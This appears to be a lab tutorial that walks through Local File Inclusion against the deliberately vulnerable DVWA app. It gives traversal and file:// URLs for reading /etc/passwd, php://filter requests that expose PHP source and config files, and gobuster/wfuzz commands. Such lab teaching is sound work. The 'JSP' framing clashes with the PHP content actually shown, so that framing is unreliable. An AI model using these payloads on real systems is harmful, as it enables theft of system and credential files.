# LFI With JSP



## What is Local File Inclusion (LFI)?
Local File Inclusion (LFI) is a vulnerability that allows an attacker to include and execute files stored on the server — typically by manipulating input parameters that control which file is loaded.


## Why JSP Applications Are Vulnerable
JSP applications are often built on Java EE / Jakarta EE frameworks like:
  - Apache Tomcat
  - Jetty
  - WildFly
  - IBM WebSphere
  - Oracle WebLogic




## LFI with JSP of File Inclusion Methodology
- So this our `Target URL`: http://192.168.100.97:8080/vulnerabilities/fi/?page=include.php
<img width="1337" height="809" alt="image" src="https://github.com/user-attachments/assets/cbe9c330-f375-4148-b860-abcde6c05128" />


### View Source
<img width="826" height="509" alt="image" src="https://github.com/user-attachments/assets/7c43d3b3-3bbb-4a4c-b5ec-25721a180588" />

- Breakdown:
````
<?php
// The page we wish to display
$file = $_GET['page'];
?>
````
- This line grabs the value of the page parameter from the URL:
````
http://192.168.100.97:8080/vulnerabilities/fi/?page=somefile
````
- - Whatever you pass as `page=...` gets assigned to the `$file` variable.
- In the full vulnerable version (not shown here), this variable is likely used in an `include()` or `require()` statement like:

````
include($file);
````
- That’s where the danger comes in.

---


- In our `Target` if i change `URL`:
````
http://192.168.100.97:8080/vulnerabilities/fi/?page=file1.php
````
<img width="895" height="732" alt="image" src="https://github.com/user-attachments/assets/dcee995c-e536-4eea-a1ca-82c226142265" />


````
http://192.168.100.97:8080/vulnerabilities/fi/?page=../../hackable/flags/fi.php
````
<img width="1921" height="865" alt="image" src="https://github.com/user-attachments/assets/eee53bce-7f74-43b7-8797-6edf7e623bca" />



## Test workflow

### Discovery with Gobuster/Dirsearch
#### Directory discovery 
````
gobuster dir -u http://192.168.100.97:8080 -w /usr/share/wordlists/dirb/common.txt
````
<img width="806" height="527" alt="image" src="https://github.com/user-attachments/assets/fd27cc82-d08e-4b0c-b2f4-dd8e7fc76a42" />



### wfuzz
- Check cookie:
   - Righ-Click -> Inspec
<img width="1916" height="531" alt="image" src="https://github.com/user-attachments/assets/38818483-3a3a-4af6-9ce1-72c73f9d2a80" />



````
wfuzz -c -w /usr/share/wordlists/wfuzz/general/common.txt -b "security=low; PHPSESSID=pr6d8jd1ldbrei4lvm133gvdq3" "http://192.168.100.97:8080/vulnerabilities/fi/?page=../../hackable/flags/FUZZ.php"
````
<img width="1762" height="814" alt="image" src="https://github.com/user-attachments/assets/5d5535b3-814d-4df0-a8f9-b7c525762743" />

<img width="603" height="803" alt="image" src="https://github.com/user-attachments/assets/423adda9-eed2-4ebc-a1ec-fed99eaa39f5" />



````
wfuzz -c --hl 81 -w /usr/share/wordlists/wfuzz/general/common.txt -b "security=low; PHPSESSID=pr6d8jd1ldbrei4lvm133gvdq3" "http://192.168.100.97:8080/vulnerabilities/fi/?page=../../hackable/flags/FUZZ.php"
````
<img width="1704" height="771" alt="image" src="https://github.com/user-attachments/assets/e6cafaf2-73d9-458d-94c0-d7abc535b6b4" />



### specific file:
````
http://192.168.100.97:8080/vulnerabilities/fi/?page=../../ids_log.php
````
<img width="1312" height="796" alt="image" src="https://github.com/user-attachments/assets/9d45e16f-6eec-4bf7-9114-1002d395a138" />


---

### PHP Source Code Disclosure
````
http://192.168.100.97:8080/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php
````
<img width="1922" height="432" alt="image" src="https://github.com/user-attachments/assets/10d1ff72-f830-4c2c-bae5-90926b344bbc" />

````
http://192.168.100.97:8080/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php
````
<img width="1919" height="479" alt="image" src="https://github.com/user-attachments/assets/0c97061d-31c1-4e21-ba40-e540e9905ed9" />

---



## Medium Level
- So in this we do with DVWA in this i set it to medium level:
<img width="812" height="656" alt="image" src="https://github.com/user-attachments/assets/2f5edfa4-f6c1-4a77-af17-743a1723f53f" />


### Path Truncation
````
http://192.168.100.97:8080/vulnerabilities/fi/?page=..//..//..//..//etc/passwd
````
<img width="1917" height="434" alt="image" src="https://github.com/user-attachments/assets/a7bf5ba7-4e9c-42ac-9b8e-566745346b76" />


### Absolute Path:
````
http://192.168.100.97:8080/vulnerabilities/fi/?page=/etc/passwd
````
<img width="1919" height="629" alt="image" src="https://github.com/user-attachments/assets/46941370-f9ea-47a5-8747-52eca8f6526d" />


````
http://192.168.100.97:8080/vulnerabilities/fi/?page=file:///etc/passwd
````
<img width="1919" height="538" alt="image" src="https://github.com/user-attachments/assets/3fbbd4e0-fb25-45c7-b13e-b0a397fcf47c" />


---



## High Security Level Bypasses

- Os in this i set it to `High Level`:
<img width="799" height="657" alt="image" src="https://github.com/user-attachments/assets/da629fae-2d8b-4eed-82ff-a14dd9896aff" />


### Using file:// Protocol
````
http://192.168.100.97:8080/vulnerabilities/fi/?page=file:///etc/passwd
````
<img width="1919" height="365" alt="image" src="https://github.com/user-attachments/assets/5c258de9-b1fe-413a-9acf-4b4f4593894b" />

---


## Advanced PHP Wrapper Exploitation

### Reading PHP Source Code
````
http://192.168.100.97:8080/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php
````
<img width="1919" height="415" alt="image" src="https://github.com/user-attachments/assets/f3fc18bd-d1c3-45f9-be13-6f347eb759cb" />



































